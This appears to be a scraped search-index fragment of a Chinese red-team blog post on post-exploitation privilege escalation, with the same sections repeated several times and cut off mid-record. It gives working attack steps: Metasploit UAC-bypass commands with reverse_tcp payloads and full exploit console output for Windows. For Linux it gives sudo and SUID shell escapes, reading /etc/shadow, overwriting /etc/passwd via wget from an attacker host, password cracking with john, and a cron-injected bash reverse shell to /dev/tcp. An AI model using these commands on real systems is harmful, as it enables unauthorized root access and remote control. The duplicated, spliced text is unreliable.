h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#22-suggester辅助脚本提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#23-烂土豆提权提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#24-dll劫持提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#25-令牌窃取提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#3psexec提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#4注册表提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#linux提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su sudo su - #使用root用户登录，不用输入root密码即可切换 ​ 利用python获取交互Shell python -c 'import pty;pty.spawn(\"/bin/sh\")' sudo su 5.任务计划 ls -l /etc/cron* cat /etc/crontab 在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升； 如权限配置不当777的执行脚本，则可以修改脚本内容进行提权； 6.覆盖passwd提权 通过OpenSSL passwd生成一个新的用户hacker，密码为hack123 openssl passwd -1 -salt hacker 123456 $1$hacker$6luIRwdGpBvXdP.GMwcZp/ 将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中 将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件 wget http://192.168.18.7/passwd -O /etc/passwd 然后在反弹shell中切换用户，或者使用ssh登录都可以 7.ssh密钥提权 cat /etc/passwd | grep bash #查找bash的用户 用MD5校验，authorized_keys id_rsa 为同一个文件 跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录 假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限 8.john破解shadow root密文登陆提权john会自动检测密文类型 –wordlist 字段文件 john --wordlist=\"/usr/share/wordlists/rockyou.txt\" userpassw 9.Ubuntu计划任务反弹shell提权 cat /etc/crontab #查看计划任务 crontab -l #查看当前用户的计划任务 ls /var/spool/cron/crontabs/root #root任务文件目录 默认情况下非root权限不可见 tail -f /var/log/syslog 通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次 发现当前用户可以修改cleanup.py文件 尝试修改计划任务进行反弹shell bash -i \u003e\u0026 /dev/tcp/192.168.18.7/7777 \u003e\u00261 ","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:2","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#1-内核溢出提权"},{"categories":["hvv"],"content":"\rLinux提权\r1 内核溢出提权 uname -a 查看系统版本和内核信息 使用searchsploit在kali 查找相关内核漏洞 searchsploit -t Ubuntu 14.04 2.sudo提权 sudo --version //查看版本 sudo -l //查看当前用户可以使用的sudo的命令程序 常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权） 利用find: sudo find . -exec /bin/sh \\; -quit或者sudo awk 'BEGIN {system(\"/bin/sh\")}' python命令提权(su root被禁止登录，python获取交互shell) sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' 其他漏洞CVE-2019-14287、CVE-2021-3156 3.suid提权① 查找具有suid权限文件： find / -user root -perm -4000 -print 2\u003e/dev/null find / -perm -u=s -type f 2\u003e/dev/null find / -user root -perm -4000 -exec ls -ldb {} \\; 执行命令： find filename -exec whoami \\; //以SUID即root权限执行命令 如果是/usr/bin/bash执行bash -p //将以root权限打开一个bash shell ② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令) nmap -v //查看版本 root@localhost:~# nmap --interactive //交互模式 nmap\u003e !sh root@localhost:~# whoami root ③ vim Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。 vim.tiny /etc/shadow //读取文件 vim来打开shell vim.tiny # Press ESC key :set shell=/bin/sh :shell 4.su 